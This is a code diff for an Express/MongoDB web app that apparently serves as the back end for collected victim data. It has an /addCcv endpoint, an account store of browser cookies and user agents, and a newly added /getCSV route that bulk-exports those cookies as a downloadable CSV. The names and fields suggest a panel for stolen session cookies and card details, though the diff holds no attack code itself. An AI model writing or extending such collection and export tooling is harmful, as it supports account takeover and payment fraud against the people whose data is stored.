@@ -1,5 +1,9 @@
 let express = require('express')
+var stringify = require('csv-stringify');
+var fs = require('fs');
+var mongoose_csv = require('mongoose-csv');
 let app = express()
+const converter = require('json-2-csv');
 let hbs = require('hbs')
 const path = require('path')
 const bodyParser = require('body-parser');
@@ -19,6 +23,7 @@ let keycodeschema = require('./schema/keycodeschema')
 let KeyCode = mongoose.model('keycode', keycodeschema, 'keycode')
 let accountSchema = require('./schema/accountSchema')
 let Account = mongoose.model('account',accountSchema,'account')
+
 //Express init
 app.set('views', path.join(__dirname, "views"))
 app.set('view engine', 'hbs')
@@ -40,9 +45,31 @@ app.post('/addCcv', async (req, res) => {
         res.send(500,'Có lỗi xảy ra' + e)
     }
 })
+function transform(doc){
+    // Return an object with all fields you need in the CSV
+    // For example ...
+    return {
+        cookies: doc.cookies,
+        userAgent: doc.userAgent,
+        date: doc.date
+    };
+}
+app.get('/getCSV', async (req, res) => {
+    let cursor = await Account.find().lean().sort([['date', -1]])
+
+    converter.json2csv(cursor, (err, csv) => {
+        if (err) {
+            throw err;
+        }
+
+
+        res.attachment('filename.csv');
+        res.status(200).send(csv);
+    });
+})
 app.get('/accountView', async (req, res) => {
     let account = await Account.find({}).sort([['date', -1]])
-
+    console.log(typeof account)
     res.render('account_view',{results: account})
 })
 app.get('/', async (req, res) => {
